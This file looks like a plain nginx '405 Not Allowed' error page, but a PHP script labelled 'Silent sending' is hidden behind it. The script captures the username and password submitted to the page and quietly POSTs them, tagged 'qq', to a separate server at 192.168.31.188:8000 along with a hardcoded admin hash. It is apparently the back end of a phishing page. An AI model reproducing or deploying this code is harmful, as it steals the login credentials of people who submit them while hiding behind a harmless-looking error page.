<html>
    <head>
        <title>405 Not Allowed</title>
    </head>
    <body>
        <center>
            <h1>405 Not Allowed</h1>
        </center>
        <hr />
        <center>nginx/1.15.11</center>
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a pading to disable MSIE and Chrome friendly error page -->
        <!-- a paddding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
    </body>
</html>

<?php
//Silent sending
function sendPost($url, $data) {
    $data = http_build_query($data);
    $options = array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-type:application/x-www-form-urlencoded',
        'content' => $data,
        'timeout' => 20 )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}

$username = $_POST['username'] ? $_POST['username'] : '';
$password = $_POST['password'] ? $_POST['password'] : '';
$data = array(
    'command' => 'writetemp',
    'admpsw' => '65ee5400415cc50cecd95b279b00c475',
    'content' => 'qq ==== '.$username.': '.$password
);
sendPost('http://192.168.31.188:8000/', $data);
?>